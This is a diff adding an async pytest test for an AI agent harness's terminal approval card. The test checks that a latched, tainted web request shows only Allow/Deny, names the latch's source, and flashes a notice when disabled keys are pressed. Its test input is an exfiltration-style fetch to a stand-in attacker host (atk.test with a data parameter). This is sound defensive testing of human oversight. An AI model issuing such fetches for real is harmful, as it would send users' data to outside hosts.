@@ -290,3 +290,54 @@ async def test_y3_a_latch_in_another_conversation_leaves_this_card_alone(
         assert _labels(app) == ["Allow", "Deny"], "the scoping test's positive control"
         await pilot.press("y")
         assert await parked is True
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("kind", ["agent_message", "other_session"])
+async def test_u1_u4_latched_card_names_its_source_and_flashes_withdrawn_keys(
+    config_dir: Path, monkeypatch: pytest.MonkeyPatch, kind: str
+) -> None:
+    """U1: the card's notice wording follows the latch's source kind; the card
+    shape does not. U4: A/S/G on a latched card flash the "options are off"
+    line instead of doing nothing, and never answer or reach the composer."""
+    from local_operator.harness import bridge_egress as be
+    from local_operator.tui.widgets import approval as approval_mod
+
+    monkeypatch.setattr(approval_mod, "LATCHED_FLASH_SECONDS", 0.2)
+    session = _LatchingSession()
+    app = OperatorApp(lambda: _factory(session))
+    async with app.run_test(size=(100, 30)) as pilot:
+        await _boot(pilot, app)
+        app._set_approve_all(False)
+        gate = _gate(session)
+        session.bridge_taint_latch.mark(kind)  # type: ignore[arg-type]
+        pending = asyncio.ensure_future(
+            gate("web_fetch", "https://atk.test/?d=x", taint_raised=True, bridge_latched=True)
+        )
+        await _wait_prompt(pilot, app)
+        card = app._approval
+        assert card is not None
+        # Same card for both kinds; only the sentence differs.
+        assert _labels(app) == ["Allow", "Deny"]
+        expected = " ".join(be.bridge_card_notice(session.bridge_taint_latch).split())
+        assert card._latched_notice == expected
+        assert ("(Agent messages)" in expected) is (kind == "agent_message")
+
+        options = " ".join(be.card_options_off_notice().split())
+        for key in ("A", "S", "G"):
+            await pilot.press(key)
+            await pilot.pause()
+            assert card._options_flash is True, f"{key} gave no feedback"
+            assert not pending.done(), f"{key} answered a latched card"
+            rows, _spans = card._callout_rows(96, two_row=True)
+            flashed = " ".join(row.plain for row in rows)
+            assert options.split()[0] in flashed
+            assert any(
+                span.style and "bold" in str(span.style) for row in rows for span in row.spans
+            )
+        await asyncio.sleep(0.4)
+        await pilot.pause()
+        assert card._options_flash is False, "the flash did not settle"
+        assert app._approve_all is False
+        await pilot.press("n")
+        assert await pending is False
